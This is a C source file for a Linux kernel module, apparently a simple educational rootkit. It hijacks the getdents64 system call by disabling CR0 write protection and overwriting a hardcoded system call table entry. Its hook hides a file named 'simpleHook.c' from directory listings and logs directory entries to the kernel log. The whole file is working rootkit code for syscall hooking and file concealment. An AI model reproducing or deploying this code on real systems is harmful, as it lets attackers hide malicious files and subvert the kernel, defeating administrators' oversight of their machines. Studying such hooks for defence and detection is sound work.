#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include<linux/dirent.h>
 
unsigned long *syscall_table = (unsigned long *)0xc169c140; 
 
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 
asmlinkage int new_getdents(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
//	printk(KERN_ALERT "fd : %d\n", fd);  Check FD
	
	//getdents will return numbers of byte it get.
    	int num = (*original_getdents)(fd, dirent, count); 
	char *buf = (char *)dirent;	//The first dirent (maybe "." )
	int bpos;			//Offset to the dirent we want.
	struct linux_dirent64 *d;	//Used to keep current dirent.

        for (bpos = 0; bpos < num;) {
	        d = (struct linux_dirent *) (buf + bpos);
                printk(KERN_ALERT "%8ld  ", d->d_ino);
                printk(KERN_ALERT "%4d %10lld  %s\n", d->d_reclen,
                           (long long) d->d_off, d->d_name);
		if(!strcmp(d->d_name, "simpleHook.c")){
			d->d_ino = 0;	//Let inode of this file become zero, then we hide it from ls.
	      	}
                bpos += d->d_reclen;	//Increase the offset to sufficiently reach next dirent.
        }

	return num;
}
 
static int init(void) {
 
    printk(KERN_ALERT "\nHIJACK INIT\n");
 
    write_cr0 (read_cr0 () & (~ 0x10000));	//Make syscall_table writable.

    //Exchange the new getdents and old getdents to complete Hook syscall.
    original_getdents = (void *)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = new_getdents;  
 
    write_cr0 (read_cr0 () | 0x10000);		//Make syscall_table unwritable.
 
    return 0;
}
 
static void exit(void) {
 
    write_cr0 (read_cr0 () & (~ 0x10000)); 

    syscall_table[__NR_getdents64] = original_getdents;  
 
    write_cr0 (read_cr0 () | 0x10000);
 
    printk(KERN_ALERT "MODULE EXIT\n");
 
    return;
}
 
module_init(init);
module_exit(exit);
